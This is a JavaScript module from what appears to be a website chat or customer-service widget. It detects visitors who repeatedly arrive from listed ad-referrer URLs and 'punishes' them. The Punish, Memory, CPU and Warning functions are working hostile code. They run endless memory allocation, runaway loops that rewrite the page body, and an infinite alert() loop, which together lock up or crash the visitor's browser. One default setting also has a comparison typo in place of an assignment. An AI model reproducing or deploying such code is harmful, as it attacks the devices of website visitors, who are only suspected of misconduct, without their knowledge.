//2013-6-7
if (tq_interval_time_type == "") tq_interval_time_type = 2;
if (tq_click_interval == "") tq_click_interval = 1;
if (tq_prevent_tip == "") tq_prevent_tip = TQKF.words[9];
if (tq_bad_click_times == "") tq_bad_click_times == 5;
TQKF.antiBadClick = {
	GetPara: function(url, name) {
		if (url == null || url == "") return null;
		var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
		var r = url.substr(url.indexOf("\?") + 1).match(reg);
		if (r != null) {
			TQ_DEBUG("tq_GetPara " + name + "from url " + url + " = " + unescape(r[2]), 3);
			return unescape(r[2])
		}
		TQ_DEBUG("tq_GetPara " + name + "from url " + url + " = null", 3);
		return null
	},
	HandleBadClick: function() {
		TQ_DEBUG("TQKF.antiBadClick.HandleBadClick", 3);
		var isInAntiURl = false;
		var hasKeyWord = false;
		TQ_DEBUG("TQKF.reffer_url=" + TQKF.reffer_url, 3);
		if (TQKF.reffer_url != null && TQKF.reffer_url != "") {
			for (var i = 0; i < TQKF.filterURLs.length; i++) {
				for (var j = 0; j < TQKF.filterURLs[i].domain.length; j++) {
					if (TQKF.reffer_url.indexOf(TQKF.filterURLs[i].domain[j]) != -1) {
						isInAntiURl = true;
						if (isInAntiURl) {
							if (TQKF.antiBadClick.GetPara(TQKF.reffer_url, TQKF.filterURLs[i].keyPara) != null) {
								hasKeyWord = true;
								TQ_DEBUG("hasKeyWord=true", 3)
							}
						}
						TQ_DEBUG("isInAntiURl=true", 3);
						break
					}
				}
			}
		}
		if (hasKeyWord) {
			var tq_temp_time = new Date().getTime();
			if ((tq_temp_time - TQKF.clientInfo.lb) > tq_prevent_time * 24 * 60 * 60 * 1000) {
				TQ_DEBUG("black time is expires", 3);
				TQKF.clientInfo.bt = 0;
				TQKF.clientInfo.ib = 0
			}
			var mini_interval_type = 60 * 60 * 1000;
			if (tq_interval_time_type == 1) mini_interval_type = mini_interval_type / 60;
			else if (tq_interval_time_type == 3) mini_interval_type = mini_interval_type * 24;
			else if (tq_interval_time_type == 4) mini_interval_type = mini_interval_type * 24 * 30;
			else if (tq_interval_time_type == 5) mini_interval_type = mini_interval_type * 24 * 365;
			if ((tq_temp_time - TQKF.clientInfo.lb) < mini_interval_type * tq_click_interval) {
				TQKF.clientInfo.bt = TQKF.clientInfo.bt + 1
			}
			TQKF.clientInfo.lb = tq_temp_time;
			if (TQKF.clientInfo.bt > tq_bad_click_times) {
				TQKF.clientInfo.ib = 1;
				TQKF.AS.WriteCookie(TQKF.clientInfo);
				TQKF.antiBadClick.Punish();
				return
			} else TQKF.AS.WriteCookie(TQKF.clientInfo)
		}
	},
	CPU: function() {
		for (var j = 0; j < 14000000; j++) {
			var tq_stemp = "";
			for (var i = 0; i < 50000000000; i++) {
				tq_stemp = tq_stemp + tq_prevent_tip;
				document.body.innerHTML = document.body.innerHTML + tq_stemp
			}
		}
		TQKF.antiBadClick.CPU()
	},
	Memory: function() {
		var a1 = new Array();
		var a2 = new Array();
		var a3 = new Array();
		var a4 = new Array();
		var a5 = new Array();
		var a6 = new Array();
		var a7 = new Array();
		var a8 = new Array();
		var m = 1;
		var n = 2;
		var cc = '1';
		for (var i = 0; i < 8192 * 2; i++) cc += '0';
		for (var j = 0; j < 8000; j++) {
			a1[j] = cc + cc + cc;
			a5[j] = cc + cc + cc;
			a2[j] = cc + cc + cc;
			a6[j] = cc + cc + cc;
			a3[j] = cc + cc + cc;
			a7[j] = cc + cc + cc;
			a4[j] = cc + cc + cc;
			a8[j] = cc + cc + cc
		}
		TQKF.antiBadClick.Memory()
	},
	Warning: function() {
		alert(tq_prevent_tip);
		TQKF.antiBadClick.Warning()
	},
	Punish: function() {
		TQ_DEBUG("tq_Punish!", 3);
		if (tq_prevent_style == 1) TQKF.antiBadClick.Warning();
		else if (tq_prevent_style == 2) {
			TQKF.antiBadClick.Memory();
			TQKF.antiBadClick.CPU();
			TQKF.antiBadClick.Warning()
		} else {
			if (TQKF.clientInfo.bt > tq_bad_click_times + 1) {
				TQKF.antiBadClick.Memory();
				TQKF.antiBadClick.CPU();
				TQKF.antiBadClick.Warning()
			} else TQKF.antiBadClick.Warning()
		}
	}
}